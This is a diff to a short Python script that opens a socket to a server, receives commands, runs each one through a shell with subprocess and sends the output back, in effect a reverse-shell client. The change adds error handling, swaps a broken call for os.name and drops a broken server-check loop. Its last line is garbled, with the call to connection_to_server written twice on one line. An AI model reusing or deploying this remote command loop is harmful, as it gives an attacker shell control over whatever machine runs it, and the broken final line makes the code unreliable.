@@ -1,8 +1,6 @@
 import socket
 import subprocess
-from os import name
-import requests
-from time import sleep
+import os
 
 port = 8080
 host = '127.0.0.1'
@@ -13,24 +11,22 @@ def connection_to_server():
     while True:
         data = s.recv(1024).decode()
         if data:
-            output = subprocess.check_output(data, shell=True).decode()
-            s.sendall(output.encode())
+            try:
+                output = subprocess.check_output(data, shell=True).decode()
+                s.sendall(output.encode())
+            except subprocess.CalledProcessError as e:
+                error_msg = f"Command failed with return code {e.returncode}"
+                s.sendall(error_msg.encode())
+            except Exception as e:
+                error_msg = f"Command failed with error: {e}"
+                s.sendall(error_msg.encode())
         
-        data1 = s.recv(1025).decode()
+        data1 = s.recv(10).decode()
         if data1:
-            output = name().decode()
+            output = os.name
             s.sendall(output.encode())
 
-def check_server(output):
-   output = requests.get(host)
-   
-while True:
-      if check_server(404 or 400):
-       print("offline")
-       sleep(1000)
-      else:
-         if __name__ =='__main__':
-            connection_to_server()
+connection_to_server()      connection_to_server()
       
 
 
